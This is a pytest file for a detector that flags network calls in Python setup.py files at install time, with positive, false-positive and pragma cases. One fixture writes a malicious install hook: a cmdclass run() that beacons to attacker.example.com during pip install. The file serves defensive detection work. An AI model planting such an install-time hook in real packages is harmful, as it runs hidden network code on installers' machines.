from __future__ import annotations

from agentsec.guards.setup_network_call import SetupNetworkCallGuard
from tests.guards._common import *  # noqa: F401,F403


def _prof(root: Path) -> StackProfile:
    return mkprofile(root, features={"python"}, python_dirs=["."])


def test_fires_on_module_level_urlopen(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "import urllib.request\n"
        "urllib.request.urlopen('https://example.com/prebuilt.tar.gz')\n"
        "from setuptools import setup\n"
        "setup(name='example')\n",
        encoding="utf-8",
    )
    findings = SetupNetworkCallGuard().run(tmp_path, _prof(tmp_path))
    assert [f.rule for f in findings] == ["setup-network-call/setup-py-network-call"]
    assert findings[0].severity == "high"


def test_fires_on_requests_get_at_module_level(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "import requests\n"
        "resp = requests.get('https://example.com/manifest.json')\n",
        encoding="utf-8",
    )
    findings = SetupNetworkCallGuard().run(tmp_path, _prof(tmp_path))
    assert [f.rule for f in findings] == ["setup-network-call/setup-py-network-call"]


def test_fires_on_nested_setup_py_path(tmp_path: Path) -> None:
    sub = tmp_path / "subpkg"
    sub.mkdir()
    (sub / "setup.py").write_text(
        "import urllib.request\n"
        "urllib.request.urlretrieve('https://example.com/prebuilt.so', 'prebuilt.so')\n",
        encoding="utf-8",
    )
    findings = SetupNetworkCallGuard().run(tmp_path, _prof(tmp_path))
    assert [f.rule for f in findings] == ["setup-network-call/setup-py-network-call"]


def test_fires_on_network_call_in_cmdclass_install_run(tmp_path: Path) -> None:
    # Miss fix: the classic malicious setup.py shape -- a custom command class
    # passed via cmdclass whose own run() makes a network call. setuptools invokes run()
    # during pip install, so this is install-time-unconditional even though the call sits
    # inside a method definition.
    (tmp_path / "setup.py").write_text(
        "import requests\n"
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "\n"
        "class CustomInstall(install):\n"
        "    def run(self):\n"
        "        requests.get('https://attacker.example.com/beacon')\n"
        "        install.run(self)\n"
        "\n"
        "setup(name='example', cmdclass={'install': CustomInstall})\n",
        encoding="utf-8",
    )
    findings = SetupNetworkCallGuard().run(tmp_path, _prof(tmp_path))
    assert [f.rule for f in findings] == ["setup-network-call/setup-cmdclass-network-call"]
    assert findings[0].severity == "high"


def test_class_with_run_method_not_in_cmdclass_does_not_fire(tmp_path: Path) -> None:
    # FP bait: a class with a run() method that makes a network call, but never registered
    # via cmdclass, is never invoked by setuptools during install.
    (tmp_path / "setup.py").write_text(
        "import requests\n"
        "from setuptools import setup\n"
        "\n"
        "class Helper:\n"
        "    def run(self):\n"
        "        requests.get('https://example.com/unrelated-tool')\n"
        "\n"
        "setup(name='example')\n",
        encoding="utf-8",
    )
    assert SetupNetworkCallGuard().run(tmp_path, _prof(tmp_path)) == []


def test_cmdclass_without_network_call_does_not_fire(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "\n"
        "class CustomInstall(install):\n"
        "    def run(self):\n"
        "        print('installing')\n"
        "        install.run(self)\n"
        "\n"
        "setup(name='example', cmdclass={'install': CustomInstall})\n",
        encoding="utf-8",
    )
    assert SetupNetworkCallGuard().run(tmp_path, _prof(tmp_path)) == []


def test_network_call_inside_a_function_does_not_fire(tmp_path: Path) -> None:
    # FP bait: a network call wrapped in a function definition only runs if explicitly called
    # -- not automatically on import/build, so it is out of this guard's scope.
    (tmp_path / "setup.py").write_text(
        "import urllib.request\n"
        "from setuptools import setup\n"
        "\n"
        "def fetch_prebuilt():\n"
        "    return urllib.request.urlopen('https://example.com/prebuilt.tar.gz')\n"
        "\n"
        "setup(name='example')\n",
        encoding="utf-8",
    )
    assert SetupNetworkCallGuard().run(tmp_path, _prof(tmp_path)) == []


def test_ordinary_setup_py_does_not_fire(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup, find_packages\n"
        "setup(name='example', packages=find_packages())\n",
        encoding="utf-8",
    )
    assert SetupNetworkCallGuard().run(tmp_path, _prof(tmp_path)) == []


def test_non_setup_py_file_is_not_scanned(tmp_path: Path) -> None:
    (tmp_path / "build_helper.py").write_text(
        "import urllib.request\n"
        "urllib.request.urlopen('https://example.com/x')\n",
        encoding="utf-8",
    )
    assert SetupNetworkCallGuard().run(tmp_path, _prof(tmp_path)) == []


def test_pragma_silences(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "# security: allow-setup-network-call\n"
        "import urllib.request\n"
        "urllib.request.urlopen('https://example.com/prebuilt.tar.gz')\n",
        encoding="utf-8",
    )
    assert SetupNetworkCallGuard().run(tmp_path, _prof(tmp_path)) == []


def test_applies_requires_python(tmp_path: Path) -> None:
    guard = SetupNetworkCallGuard()
    assert guard.applies(mkprofile(tmp_path, features={"python"})) is True
    assert guard.applies(mkprofile(tmp_path, features={"javascript"})) is False
